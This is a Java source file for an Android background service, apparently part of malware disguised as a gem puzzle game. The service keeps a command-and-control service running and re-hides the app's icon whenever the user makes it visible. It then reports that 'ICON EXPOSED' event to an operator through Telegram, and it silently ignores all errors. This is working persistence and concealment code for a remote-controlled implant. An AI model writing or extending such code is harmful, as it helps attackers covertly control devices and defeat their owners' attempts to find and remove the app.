package com.gempuzzle.quest.c2;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import androidx.annotation.Nullable;

/**
 * Self-heal service — 60s loop. Re-checks critical services
 * and re-nags for missing permissions. If icon was re-enabled
 * by user, re-hides it and alerts admin.
 */
public class SelfHealService extends Service {

    private Handler handler;
    private Runnable tick;

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        tick = new Runnable() {
            @Override
            public void run() {
                try {
                    // Ensure C2 running
                    if (!isRunning("C2Service")) {
                        Intent svc = new Intent(SelfHealService.this, C2Service.class);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc);
                        else startService(svc);
                    }
                    // Auto re-hide if exposed
                    if (!IconHider.isHidden(SelfHealService.this) && shouldBeHidden()) {
                        IconHider.hide(SelfHealService.this);
                        TelegramClient.sendMessage("⚠ ICON EXPOSED, RE-HIDDEN");
                    }
                } catch (Throwable ignored) {}
                handler.postDelayed(this, 60 * 1000);
            }
        };
        handler.postDelayed(tick, 30 * 1000);
    }

    private boolean shouldBeHidden() {
        return getSharedPreferences("gq", Context.MODE_PRIVATE).getBoolean("should_hide", true);
    }

    private boolean isRunning(String name) {
        android.app.ActivityManager am = (android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE);
        for (android.app.ActivityManager.RunningServiceInfo rs : am.getRunningServices(100)) {
            if (rs.service.getClassName().endsWith(name)) return true;
        }
        return false;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        if (handler != null && tick != null) handler.removeCallbacks(tick);
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
